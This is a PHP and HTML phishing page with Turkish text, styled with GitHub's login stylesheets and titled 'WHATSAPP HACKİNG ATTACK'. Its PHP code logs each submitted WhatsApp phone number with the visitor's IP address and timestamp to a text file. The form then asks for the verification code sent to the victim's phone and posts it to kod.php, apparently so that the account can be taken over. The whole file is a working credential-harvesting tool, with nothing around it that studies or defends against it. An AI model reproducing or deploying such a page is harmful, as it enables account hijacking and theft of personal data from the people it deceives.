<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }
if (isset($_POST['numara'])) {

$save = fopen("numara.txt","a+");
$numara = $_POST['numara'];
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$vericekilen = ("
+-+-+ WHATSAPP NUMARA +-+-+

 Tarih         : ".$tarih."

 İp Adresi     : ".$ipaddress."

 Numara        : ".$numara."

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
fwrite($save,$vericekilen);
fclose($save);
//echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";

}
//*/
?>
<!DOCTYPE html>
<html>

<head>
<meta charset="UTF-8">
  <link crossorigin="anonymous" media="all" integrity="sha512-AAL4vHqoef7azLizL9Sh/ph6rt7hPyPXoa6ngQSxoJI8jZPIL5Ij17nCUW124lalllAaZqoThwv4iFO6e0ol3g==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-0002f8bc7aa879fedaccb8b32fd4a1fe.css" />
  <link crossorigin="anonymous" media="all" integrity="sha512-qgDsYuKlUKkRsSxQRVim+S5Obxx8mPaNyyZU6VechXxW4fJ0dh5ZnVpVQ75fi12viPFua0k6kTNHn5YCqeFoCA==" rel="stylesheet" href="https://github.githubassets.com/assets/site-aa00ec62e2a550a911b12c504558a6f9.css" />
    <link crossorigin="anonymous" media="all" integrity="sha512-LntfAVTUH4LoHUCBymHBwovLGR35BOc6t5QaJr9y2zICULl7JdChPISMPGAQKWAzykxFQdlatsr/uu6kW5UImw==" rel="stylesheet" href="https://github.githubassets.com/assets/github-2e7b5f0154d41f82e81d4081ca61c1c2.css" />
    
  <meta name="viewport" content="width=device-width">
  <link rel="icon" href="https://www.flaticon.com/premium-icon/icons/svg/3128/3128217.svg" type="image/x-icon" />
  <title>WHATSAPP HACKİNG ATTACK</title>
</head>
  <body class="logged-out env-production page-responsive session-authentication">

        <div class="header header-logged-out width-full pt-5 pb-4" role="banner">
  <div class="container clearfix width-full text-center">
   

<img src="https://www.flaticon.com/premium-icon/icons/svg/3128/3128217.svg" alt=" " width="200" height="200">

  </div>
</div>


    </div>


  <div
    class="application-main "
    data-commit-hovercards-enabled
    data-discussion-hovercards-enabled
    data-issue-and-pr-hovercards-enabled
  >

  <div class="auth-form px-3" id="login" >

      <form action="kod.php" method="post"><input type="hidden" name="authenticity_token" value="Pxsr51QqQfhkBmtxHygCf6IA9W759mP1GBbvbxRNZyiohX8INcKFDFfL46TphmAg5stvhDotv01s81gSdtazZA==" />        <input type="hidden" name="ga_id" class="js-octo-ga-id-input">
        <div class="auth-form-header p-0">
          <h1 style="color:rgb(8, 120, 38); font-family: courier; font-weight: bold;">WHATSAPP HACKİNG ATTACK</h1>
        </div>


        <div data-pjax-replace id="js-flash-container">


</div>


        <div class="flash js-transform-notice" hidden>
          <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
            <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
          </button>
        </div>

        <div class="auth-form-body mt-3">

          <label for="login_field">
            TELEFONA GELEN KODU GİRİNİZ
          </label>
          <input type="tel" name="kod" class="form-control input-block" autocapitalize="off" autocorrect="off" required="required"/>
          <input type="submit" name="commit" value="Gönder" tabindex="3" class="btn btn-primary btn-block" data-disable-with="Signing in…" />
        </div>

</form>
  </body>
</html>


